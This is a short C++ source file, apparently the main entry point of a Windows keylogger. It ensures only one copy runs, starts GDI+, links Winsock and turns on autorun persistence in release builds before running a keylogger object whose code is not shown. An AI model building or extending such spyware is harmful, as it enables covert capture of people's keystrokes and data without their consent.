
#include "stdafx.h"
#include "Hax.h"
#include "Keylogger.h"

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "Ws2_32.lib")

using namespace Gdiplus;

TCHAR semName[] = _T("VSem");

int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
{
    HANDLE hSem = CreateSemaphore(NULL, 1, 1, semName);
    if (WaitForSingleObject(hSem, 0) == WAIT_TIMEOUT)
    {
        Error(_T("Already running"));
        CloseHandle(hSem);
        return 0;
    }

    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR           gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    keylogger.SetAutorun(true);
#ifdef _DEBUG
    keylogger.SetAutorun(false);
#endif
    keylogger.Run();

    CloseHandle(hSem);
    return 0;
}
